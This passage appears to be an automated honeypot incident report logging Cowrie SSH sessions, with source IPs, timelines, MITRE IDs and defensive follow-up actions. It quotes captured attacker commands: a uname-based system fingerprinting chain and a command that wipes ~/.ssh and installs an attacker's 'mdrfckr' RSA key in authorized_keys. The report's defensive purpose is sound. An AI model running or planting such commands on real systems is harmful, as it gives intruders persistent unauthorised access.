| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 18:27:45` | `cowrie.session.connect` |
| `2026-07-08 18:27:46` | `cowrie.client.version` |
| `2026-07-08 18:27:46` | `cowrie.client.kex` |
| `2026-07-08 18:27:47` | `cowrie.login.success` |
| `2026-07-08 18:27:48` | `cowrie.session.params` |
| `2026-07-08 18:27:48` | `cowrie.command.input` |
| `2026-07-08 18:27:48` | `cowrie.command.input` |
| `2026-07-08 18:27:48` | `cowrie.command.input` |
| `2026-07-08 18:27:48` | `cowrie.command.input` |
| `2026-07-08 18:27:48` | `cowrie.command.input` |
| `2026-07-08 18:27:48` | `cowrie.command.success` |
| `2026-07-08 18:27:48` | `cowrie.command.input` |
| `2026-07-08 18:27:48` | `cowrie.command.input` |
| `2026-07-08 18:27:48` | `cowrie.command.input` |
| `2026-07-08 18:27:48` | `cowrie.command.input` |
| `2026-07-08 18:27:48` | `cowrie.log.closed` |
| `2026-07-08 18:27:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6dde6b3050af

| Field | Detail |
|---|---|
| **Source IP** | `43.134.230[.]165` |
| **First Seen** | 2026-07-08 18:29 |
| **Last Seen** | 2026-07-08 18:29 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 18:29:02` | `cowrie.session.connect` |
| `2026-07-08 18:29:02` | `cowrie.client.version` |
| `2026-07-08 18:29:02` | `cowrie.client.kex` |
| `2026-07-08 18:29:03` | `cowrie.login.success` |
| `2026-07-08 18:29:04` | `cowrie.session.params` |
| `2026-07-08 18:29:04` | `cowrie.command.input` |
| `2026-07-08 18:29:04` | `cowrie.command.failed` |
| `2026-07-08 18:29:05` | `cowrie.log.closed` |
| `2026-07-08 18:29:06` | `cowrie.session.params` |
| `2026-07-08 18:29:06` | `cowrie.command.input` |
| `2026-07-08 18:29:06` | `cowrie.session.file_download` |
| `2026-07-08 18:29:06` | `cowrie.log.closed` |
| `2026-07-08 18:29:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.134.230[.]165` to AbuseIPDB if not already reported
- [ ] Block `43.134.230[.]165` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-81d52ffdc407

| Field | Detail |
|---|---|
| **Source IP** | `43.134.230[.]165` |
| **First Seen** | 2026-07-08 18:29 |
| **Last Seen** | 2026-07-08 18:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 18:29:06` | `cowrie.session.connect` |
| `2026-07-08 18:29:06` | `cowrie.client.version` |
| `2026-07-08 18:29:06` | `cowrie.client.kex` |
| `2026-07-08 18:29:07` | `cowrie.login.success` |
| `2026-07-08 18:29:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.134.230[.]165` to AbuseIPDB if not already reported
- [ ] Block `43.134.230[.]165` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f4ba28e9a7d4

| Field | Detail |
|---|---|
| **Source IP** | `43.134.230[.]165` |
| **First Seen** | 2026-07-08 18:29 |
| **Last Seen** | 2026-07-08 18:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 18:29:08` | `cowrie.session.connect` |
| `2026-07-08 18:29:08` | `cowrie.client.version` |
| `2026-07-08 18:29:08` | `cowrie.client.kex` |
| `2026-07-08 18:29:09` | `cowrie.login.success` |
| `2026-07-08 18:29:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.134.230[.]165` to AbuseIPDB if not already reported
- [ ] Block `43.134.230[.]165` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fabd083c1be2

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]114` |
| **First Seen** | 2026-07-08 18:29 |
| **Last Seen** | 2026-07-08 18:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 18:29:52` | `cowrie.session.connect` |
| `2026-07-08 18:29:52` | `cowrie.client.version` |
| `2026-07-08 18:29:53` | `cowrie.client.kex` |
| `2026-07-08 18:29:53` | `cowrie.login.success` |
| `2026-07-08 18:29:53` | `cowrie.session.params` |
| `2026-07-08 18:29:53` | `cowrie.command.input` |
| `2026-07-08 18:29:54` | `cowrie.log.closed` |
| `2026-07-08 18:29:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]114` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]114` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b544434b3992

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-08 18:30 |
| **Last Seen** | 2026-07-08 18:30 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 18:30:21` | `cowrie.session.connect` |
| `2026-07-08 18:30:21` | `cowrie.client.version` |
| `2026-07-08 18:30:21` | `cowrie.client.kex` |
| `2026-07-08 18:30:22` | `cowrie.login.success` |
| `2026-07-08 18:30:23` | `cowrie.session.params` |
| `2026-07-08 18:30:23` | `cowrie.command.input` |
| `2026-07-08 18:30:23` | `cowrie.command.input` |
| `2026-07-08 18:30:23` | `cowrie.command.input` |
| `2026-07-08 18:30:23` | `cowrie.command.input` |
| `2026-07-08 18:30:23` | `cowrie.command.input` |
| `2026-07-08 18:30:23` | `cowrie.command.success` |
| `2026-07-08 18:30:23` | `cowrie.command.input` |
| `2026-07-08 18:30:23` | `cowrie.command.input` |
| `2026-07-08 18:30:23` | `cowrie.command.input` |
| `2026-07-08 18:30:23` | `cowrie.command.input` |
| `2026-07-08 18:30:23` | `cowrie.log.closed` |
| `2026-07-08 18:30:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-63c7c93c8b17

| Field | Detail |
|---|---|
| **Source IP** | `65.20.237[.]191` |
| **First Seen** | 2026-07-08 18:30 |
| **Last Seen** | 2026-07-08 18:30 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 18:30:22` | `cowrie.session.connect` |
| `2026-07-08 18:30:23` | `cowrie.client.version` |
| `2026-07-08 18:30:23` | `cowrie.client.kex` |
| `2026-07-08 18:30:25` | `cowrie.login.success` |
| `2026-07-08 18:30:25` | `cowrie.direct-tcpip.request` |
| `2026-07-08 18:30:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.237[.]191` to AbuseIPDB if not already reported
- [ ] Block `65.20.237[.]191` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-12d16c7f84b0

| Field | Detail |
|---|---|
| **Source IP** | `45.182.5[.]98` |
| **First Seen** | 2026-07-08 18:30 |
| **Last Seen** | 2026-07-08 18:30 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 18:30:31` | `cowrie.session.connect` |
| `2026-07-08 18:30:31` | `cowrie.client.version` |
| `2026-07-08 18:30:31` | `cowrie.client.kex` |
| `2026-07-08 18:30:35` | `cowrie.login.success` |
| `2026-07-08 18:30:37` | `cowrie.direct-tcpip.request` |
| `2026-07-08 18:30:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.182.5[.]98` to AbuseIPDB if not already reported
- [ ] Block `45.182.5[.]98` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b8436ae93c2e

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-08 18:31 |
| **Last Seen** | 2026-07-08 18:31 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 18:31:28` | `cowrie.session.connect` |
| `2026-07-08 18:31:28` | `cowrie.client.version` |
| `2026-07-08 18:31:28` | `cowrie.client.kex` |
| `2026-07-08 18:31:28` | `cowrie.login.success` |
| `2026-07-08 18:31:28` | `cowrie.direct-tcpip.request` |
| `2026-07-08 18:31:28` | `cowrie.direct-tcpip.data` |
| `2026-07-08 18:31:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2b4f662c0cf8

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-08 18:33 |
| **Last Seen** | 2026-07-08 18:33 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 18:33:00` | `cowrie.session.connect` |
| `2026-07-08 18:33:00` | `cowrie.client.version` |
| `2026-07-08 18:33:00` | `cowrie.client.kex` |
| `2026-07-08 18:33:01` | `cowrie.login.success` |
| `2026-07-08 18:33:02` | `cowrie.session.params` |
| `2026-07-08 18:33:02` | `cowrie.command.input` |
| `2026-07-08 18:33:02` | `cowrie.command.input` |
| `2026-07-08 18:33:02` | `cowrie.command.input` |
| `2026-07-08 18:33:02` | `cowrie.command.input` |
| `2026-07-08 18:33:02` | `cowrie.command.input` |
| `2026-07-08 18:33:02` | `cowrie.command.success` |
| `2026-07-08 18:33:02` | `cowrie.command.input` |
| `2026-07-08 18:33:02` | `cowrie.command.input` |
| `2026-07-08 18:33:02` | `cowrie.command.input` |
| `2026-07-08 18:33:02` | `cowrie.command.input` |
| `2026-07-08 18:33:03` | `cowrie.log.closed` |
| `2026-07-08 18:33:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-72c2f4ca2db2

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-08 18:34 |
| **Last Seen** | 2026-07-08 18:34 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 18:34:44` | `cowrie.session.connect` |
| `2026-07-08 18:34:45` | `cowrie.client.version` |
| `2026-07-08 18:34:45` | `cowrie.client.kex` |
| `2026-07-08 18:34:50` | `cowrie.login.success` |
| `2026-07-08 18:34:54` | `cowrie.session.params` |
| `2026-07-08 18:34:54` | `cowrie.command.input` |
| `2026-07-08 18:34:55` | `cowrie.log.closed` |
| `2026-07-08 18:34:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-03c2f6c299f7

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-08 18:35 |
| **Last Seen** | 2026-07-08 18:35 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 18:35:28` | `cowrie.session.connect` |
| `2026-07-08 18:35:28` | `cowrie.client.version` |
| `2026-07-08 18:35:28` | `cowrie.client.kex` |
| `2026-07-08 18:35:29` | `cowrie.login.success` |
| `2026-07-08 18:35:30` | `cowrie.session.params` |
| `2026-07-08 18:35:30` | `cowrie.command.input` |
| `2026-07-08 18:35:30` | `cowrie.command.input` |
| `2026-07-08 18:35:30` | `cowrie.command.input` |
| `2026-07-08 18:35:30` | `cowrie.command.input` |
| `2026-07-08 18:35:30` | `cowrie.command.input` |
| `2026-07-08 18:35:30` | `cowrie.command.success` |
| `2026-07-08 18:35:30` | `cowrie.command.input` |
| `2026-07-08 18:35:30` | `cowrie.command.input` |
| `2026-07-08 18:35:30` | `cowrie.command.input` |
| `2026-07-08 18:35:30` | `cowrie.command.input` |
| `2026-07-08 18:35:31` | `cowrie.log.closed` |
| `2026-07-08 18:35:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-36d75f2b715e

| Field | Detail |
|---|---|
| **Source IP** | `124.67.120[.]106` |
| **First Seen** | 2026-07-08 18:36 |
| **Last Seen** | 2026-07-08 18:36 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 18:36:34` | `cowrie.session.connect` |
| `2026-07-08 18:36:34` | `cowrie.client.version` |
| `2026-07-08 18:36:34` | `cowrie.client.kex` |
| `2026-07-08 18:36:37` | `cowrie.login.success` |
| `2026-07-08 18:36:38` | `cowrie.direct-tcpip.request` |
| `2026-07-08 18:36:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `124.67.120[.]106` to AbuseIPDB if not already reported
- [ ] Block `124.67.120[.]106` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0463c91f1773

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-08 18:38 |
| **Last Seen** | 2026-07-08 18:38 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 18:38:04` | `cowrie.session.connect` |
| `2026-07-08 18:38:04` | `cowrie.client.version` |
| `2026-07-08 18:38:05` | `cowrie.client.kex` |
| `2026-07-08 18:38:06` | `cowrie.login.success` |
| `2026-07-08 18:38:07` | `cowrie.session.params` |
| `2026-07-08 18:38:07` | `cowrie.command.input` |
| `2026-07-08 18:38:07` | `cowrie.command.input` |
| `2026-07-08 18:38:07` | `cowrie.command.input` |
| `2026-07-08 18:38:07` | `cowrie.command.input` |
| `2026-07-08 18:38:07` | `cowrie.command.input` |
| `2026-07-08 18:38:07` | `cowrie.command.success` |
| `2026-07-08 18:38:07` | `cowrie.command.input` |
| `2026-07-08 18:38:07` | `cowrie.command.input` |
| `2026-07-08 18:38:07` | `cowrie.command.input` |
| `2026-07-08 18:38:07` | `cowrie.command.input` |
| `2026-07-08 18:38:07` | `cowrie.log.closed` |
| `2026-07-08 18:38:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0880339fb318

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-08 18:40 |
| **Last Seen** | 2026-07-08 18:40 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 18:40:39` | `cowrie.session.connect` |
| `2026-07-08 18:40:39` | `cowrie.client.version` |
| `2026-07-08 18:40:39` | `cowrie.client.kex` |
| `2026-07-08 18:40:40` | `cowrie.login.success` |
| `2026-07-08 18:40:41` | `cowrie.session.params` |
| `2026-07-08 18:40:41` | `cowrie.command.input` |
| `2026-07-08 18:40:41` | `cowrie.command.input` |
| `2026-07-08 18:40:41` | `cowrie.command.input` |
| `2026-07-08 18:40:41` | `cowrie.command.input` |
| `2026-07-08 18:40:41` | `cowrie.command.input` |
| `2026-07-08 18:40:41` | `cowrie.command.success` |
| `2026-07-08 18:40:41` | `cowrie.command.input` |
| `2026-07-08 18:40:41` | `cowrie.command.input` |
| `2026-07-08 18:40:41` | `cowrie.command.input` |
| `2026-07-08 18:40:41` | `cowrie.command.input` |
| `2026-07-08 18:40:42` | `cowrie.log.closed` |
| `2026-07-08 18:40:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f9b8fa4944dc

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]114` |
| **First Seen** | 2026-07-08 18:40 |
| **Last Seen** | 2026-07-08 18:40 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 18:40:44` | `cowrie.session.connect` |
| `2026-07-08 18:40:44` | `cowrie.client.version` |
| `2026-07-08 18:40:44` | `cowrie.client.kex` |
| `2026-07-08 18:40:45` | `cowrie.login.success` |
| `2026-07-08 18:40:46` | `cowrie.session.params` |
| `2026-07-08 18:40:46` | `cowrie.command.input` |
| `2026-07-08 18:40:46` | `cowrie.log.closed` |
| `2026-07-08 18:40:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]114` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]114` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-44cb260a4bc7

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-08 18:43 |
| **Last Seen** | 2026-07-08 18:43 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 18:43:03` | `cowrie.session.connect` |
| `2026-07-08 18:43:04` | `cowrie.client.version` |
| `2026-07-08 18:43:04` | `cowrie.client.kex` |
| `2026-07-08 18:43:05` | `cowrie.login.success` |
| `2026-07-08 18:43:06` | `cowrie.session.params` |
| `2026-07-08 18:43:06` | `cowrie.command.input` |
| `2026-07-08 18:43:06` | `cowrie.command.input` |
| `2026-07-08 18:43:06` | `cowrie.command.input` |
| `2026-07-08 18:43:06` | `cowrie.command.input` |
| `2026-07-08 18:43:06` | `cowrie.command.input` |
| `2026-07-08 18:43:06` | `cowrie.command.success` |
| `2026-07-08 18:43:06` | `cowrie.command.input` |
| `2026-07-08 18:43:06` | `cowrie.command.input` |
| `2026-07-08 18:43:06` | `cowrie.command.input` |
| `2026-07-08 18:43:06` | `cowrie.command.input` |
| `2026-07-08 18:43:07` | `cowrie.log.closed` |
| `2026-07-08 18:43:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0bed5b117f46

| Field | Detail |
|---|---|
| **Source IP** | `172.96.182[.]111` |
| **First Seen** | 2026-07-08 18:43 |
| **Last Seen** | 2026-07-08 18:43 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
